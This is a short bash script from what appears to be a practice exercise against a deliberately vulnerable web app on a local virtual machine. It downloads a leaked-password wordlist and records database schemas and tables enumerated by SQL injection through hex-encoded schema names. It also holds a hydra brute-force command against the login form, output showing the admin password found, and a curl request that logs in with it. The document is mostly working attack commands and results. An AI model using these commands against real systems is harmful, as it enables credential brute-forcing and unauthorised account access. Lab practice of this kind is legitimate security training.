#!/bin/bash
./db_info.sh

curl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top1000.txt" > passlist.txt
# schema_name from information_schema.schemata
# information_schema
# Member_Brute_Force
# Member_Sql_Injection
# Member_guestbook
# Member_images
# Member_survey
# ----------------------------------------------------------------------------------------------------
# table_name: Member_Brute_Force
# table_name FROM information_schema.tables WHERE table_schema =  0x4d656d6265725f42727574655f466f726365
# db_default
# ----------------------------------------------------------------------------------------------------
# table_name: Member_Sql_Injection
# table_name FROM information_schema.tables WHERE table_schema =  0x4d656d6265725f53716c5f496e6a656374696f6e
# users
# ----------------------------------------------------------------------------------------------------
# table_name: Member_guestbook
# table_name FROM information_schema.tables WHERE table_schema =  0x4d656d6265725f6775657374626f6f6b
# guestbook
# ----------------------------------------------------------------------------------------------------
# table_name: Member_images
# table_name FROM information_schema.tables WHERE table_schema =  0x4d656d6265725f696d61676573
# list_images
# ----------------------------------------------------------------------------------------------------
# table_name: Member_survey
# table_name FROM information_schema.tables WHERE table_schema =  0x4d656d6265725f737572766579
# vote_dbs
# ----------------------------------------------------------------------------------------------------
#hydra 10.0.2.15 -s 10080 http-form-get -m "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login#:F=WrongAnswer" -l admin -I -P passlist.txt -t 16
# Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

# Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-19 01:21:15
# [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
# [DATA] max 16 tasks per 1 server, overall 16 tasks, 3997 login tries (l:1/p:3997), ~250 tries per task
# [DATA] attacking http-get-form://10.0.2.15:10080//index.php:page=signin&username=^USER^&password=^PASS^&Login=Login#:F=WrongAnswer
# [10080][http-get-form] host: 10.0.2.15   login: admin   password: shadow
# 1 of 1 target successfully completed, 1 valid password found
# Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-19 01:21:41

curl "http://10.0.2.15/index.php?page=signin&username=admin&password=shadow&Login=Login#"
